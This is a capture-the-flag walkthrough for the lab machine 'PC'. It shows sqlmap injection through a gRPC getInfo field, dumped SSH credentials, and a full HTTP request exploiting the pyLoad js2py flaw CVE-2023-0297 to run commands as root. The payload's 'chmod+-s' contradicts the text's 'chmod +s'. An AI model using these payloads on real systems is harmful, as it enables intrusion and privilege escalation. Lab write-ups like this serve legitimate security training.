# PC
## Enumeration:

Start off with an nmap scan: 
```vim
nmap -sV -sC -v -Pn -p- --min-rate=10000 <IP_ADDR>
```

We get a response like this:
```vim
Nmap scan report for 10.10.11.214
Host is up (0.20s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
```

Port 50051 is something that I have never seen so I try to look it up, and some results pointed me towards gRPC. Looking a bit further, I found out that there was an authentication API by gRPC which uses the 50051 port: https://grpc.io/docs/guides/auth/


I went looking for a gRPC UI because I did not want to code one in (apparently there are docs for that) and luckily I came across the following on [GitHub](https://github.com/fullstorydev/grpcui)

After installing that, you just have to run: `grpcui -plaintext <IP_ADDR>:<PORT>`

We get the following Web UI open up:
![Image](images/1.png)

We can see 3 methods in this `SimpleApp` service, being `LoginUser`, `RegisterUser` and `getInfo`.  We can first register a user using `RegisterUser` (if you try credentials like `admin:admin` you will see that it is already in use, thereby leaking a username). On the `LoginUser` method, you can sign in and get an ID along with a JWT Token like this:

![Image](images/2.png)

In the `getInfo` method, you have to submit the JWT token as well as an ID:
![Image](images/3.png)

However, this will only give you a response of `{"message": "Will update soon."}`, and if you try an ID like `1`, it will give you `{"message": "The admin is working hard to fix the issues."}`.

## Exploit:

Looking at the JWT token, we can see that it can be decoded to this:
![Image](images/4.png)

I saw that it uses the `HS256` encryption algorithm and tried to bruteforce the key with `jwt2john` but that didn't seem to help either.

After looking back at the whole picture, I thought about how the ID field probably is interacting with a database as the accounts you make get deleted after some time. I saved the web request like this:
```http
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:46367
Content-Length: 193
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Content-Type: application/json
Accept: */*
X-Requested-With: XMLHttpRequest
x-grpcui-csrf-token: Cm9yuktpwgUvGB14oJokEBYYd-O7EjVhBc81_E20JGg
sec-ch-ua-platform: "Linux"
Origin: http://127.0.0.1:46367
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:46367/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _grpcui_csrf_token=Cm9yuktpwgUvGB14oJokEBYYd-O7EjVhBc81_E20JGg
Connection: close

{"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibG9sbG9sIiwiZXhwIjoxNjg1Nzg4ODA0fQ.ISyywniVjdl9SU2wJeaBmTixk6qAgTSPg1KB52N9h2A"}],"data":[{"id":"1*"}]}
```

I added the `*` after putting the `id` as `1` so as to tell SQLMap the point of injection. 

I ran `sqlmap -r request.req --batch` and got the following response:

![Image](images/5.png)

So the ID field is SQL injectable, so I try to dump the database using the `--dump` option

![Image](images/6.png)

We can see the `sau:HereIsYourPassWord1431` credentials. So I tried using the `getInfo` method with these credentials but it did not give me anything new. I tried to SSH into the machine with these credentials and it worked.

User flag can be found in `/home/sau/user.txt`

## Privilege Escalation:

I ran `ss -tunlp` and saw the following output:

```vim
sau@pc:~$ ss -tunlp
Netid     State      Recv-Q     Send-Q         Local Address:Port           Peer Address:Port     Process     
udp       UNCONN     0          0              127.0.0.53%lo:53                  0.0.0.0:*                    
udp       UNCONN     0          0                    0.0.0.0:68                  0.0.0.0:*                    
tcp       LISTEN     0          4096           127.0.0.53%lo:53                  0.0.0.0:*                    
tcp       LISTEN     0          128                  0.0.0.0:22                  0.0.0.0:*                    
tcp       LISTEN     0          5                  127.0.0.1:8000                0.0.0.0:*                    
tcp       LISTEN     0          128                  0.0.0.0:9666                0.0.0.0:*                    
tcp       LISTEN     0          128                     [::]:22                     [::]:*                    
tcp       LISTEN     0          4096                       *:50051                     *:*                    
```

Port `8000` and `9666` seem to be in use when there aren't any services that I know are using them. So I tried out `wget 127.0.0.1:8000` and got back an `index.html` which implies that we have to do port forwarding to access this webpage.

Run the following to make a reverse proxy tunnel:
```
ssh -L 8000:127.0.0.1:8000 sau@<IP_ADDR>
```

Now if we go to `http://127.0.0.1:8000`, we will see a PyLoad login page. Looking up vulnerabilities will bring you to this POC: https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad

This vulnerability revolves around `eval_js()`, a method defined in `js2py` which runs Javascript code passed via the `jk` request parameter. However, the exploit works via the `pyimport` statement which allows importing python code from Javascript, effectively allowing you to use python libraries like `os` to execute arbitrary commands.

To perform this exploit, we can send the following HTTP request via BurpSuite:
```http
POST /flash/addcrypted2 HTTP/1.1

Host: 127.0.0.1:8000

Content-Type: application/x-www-form-urlencoded

Content-Length: 110


jk=pyimport%20os;os.system("chmod+-s+/bin/bash");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
```

The above request will run `chmod +s /bin/bash` allowing you to run `bash -p` and get a root shell. You will get a 500 error on sending the response, but this exploit is a blind code execution so your bash code will be executed.

Root flag can be found in `/root/root.txt`
